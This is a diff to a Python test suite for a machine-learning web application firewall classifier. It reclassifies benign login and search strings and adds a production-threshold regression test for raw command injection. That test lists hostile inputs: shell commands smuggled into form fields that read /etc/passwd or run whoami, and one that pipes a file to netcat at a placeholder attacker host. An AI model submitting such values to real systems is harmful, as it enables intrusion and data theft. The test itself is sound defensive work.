@@ -214,6 +214,14 @@ def test_transformer_blocks_attacks(transformer_classifier, payload, expected):
         # 70k real-traffic samples) — was xfail before, now genuinely passes even
         # at this test's strict WAF_THRESHOLD default of 0.5 (production runs 0.8).
         "category=electronics&brand=sony",
+        # Fixed by the follow-up retrain adding ml/waf/synth_benign.py's 8000
+        # synthetic login/checkout/search/contact/API bodies. Both now predict
+        # "clean" as the TOP label (not just under-threshold), so they pass at
+        # any threshold, including a novel login/password pair never seen in
+        # training verbatim — a real generalization signal, not memorization.
+        "q=best pizza near me",
+        "username=admin&password=secret123",
+        "user=bob&pwd=Hunter2!",
     ],
 )
 def test_transformer_allows_benign_in_distribution(transformer_classifier, benign):
@@ -221,32 +229,41 @@ def test_transformer_allows_benign_in_distribution(transformer_classifier, benig
     assert p.blocked is False
 
 
-@needs_distilbert
-@pytest.mark.xfail(
-    reason="known weakness: bare simple-English key=value query strings remain "
-    "thin in the clean corpus (goodqueries.txt is 96% pathless URLs, not "
-    "key=value pairs) — still fails at this test's 0.5 threshold though it "
-    "clears production's 0.8 WAF_THRESHOLD",
-    strict=True,
-)
-@pytest.mark.parametrize("benign", ["q=best pizza near me"])
-def test_transformer_allows_benign_out_of_distribution(transformer_classifier, benign):
-    p = transformer_classifier.predict(benign)
-    assert p.blocked is False
+@pytest.fixture(scope="module")
+def transformer_classifier_prod_threshold():
+    """Matches the actual deployed WAF_THRESHOLD (0.8), not this suite's
+    stricter 0.5 default — some regression cases only fail at the real
+    production setting, not at the fixture's default."""
+    c = WAFClassifier(model_path=DISTILBERT_DIR, threshold=0.8)
+    assert c.load() is True
+    return c
 
 
 @needs_distilbert
 @pytest.mark.xfail(
-    reason="known weakness: benign login/credential-style POST bodies "
-    "(username=admin&password=...) remain unrepresented in any available "
-    "public benign corpus (nobody publishes real form bodies) — blocks at "
-    "0.999 confidence, clears no reasonable threshold. Needs synthesized "
-    "(faker-generated) benign form/JSON bodies, not more scraped URLs.",
+    reason="REGRESSION introduced by the synth-forms retrain, confirmed at "
+    "production's actual WAF_THRESHOLD=0.8: command_injection was already the "
+    "thinnest class (61 held-out samples, weakest P/R in the taxonomy) and "
+    "growing clean+synth further diluted its decision boundary. Root cause: "
+    "the SecLists commix payload source (8262 samples, added 2026-07-31) is "
+    "100% percent-encoded (%3B, %7C, ...) — it adds volume but not "
+    "raw-separator diversity, so literal `;`/`|` next to a plain command "
+    "stays out-of-distribution. Needs raw (unencoded) command_injection "
+    "samples specifically, not more encoded ones.",
     strict=True,
 )
-def test_transformer_allows_benign_login_form(transformer_classifier):
-    p = transformer_classifier.predict("username=admin&password=secret123")
-    assert p.blocked is False
+@pytest.mark.parametrize(
+    "payload",
+    [
+        "host=127.0.0.1; cat /etc/passwd",
+        "ip=8.8.8.8; whoami",
+        "input=$(whoami)",
+        "file=test.txt | nc attacker.com 4444",
+    ],
+)
+def test_transformer_blocks_raw_command_injection(transformer_classifier_prod_threshold, payload):
+    p = transformer_classifier_prod_threshold.predict(payload)
+    assert p.blocked is True
 
 
 @needs_distilbert
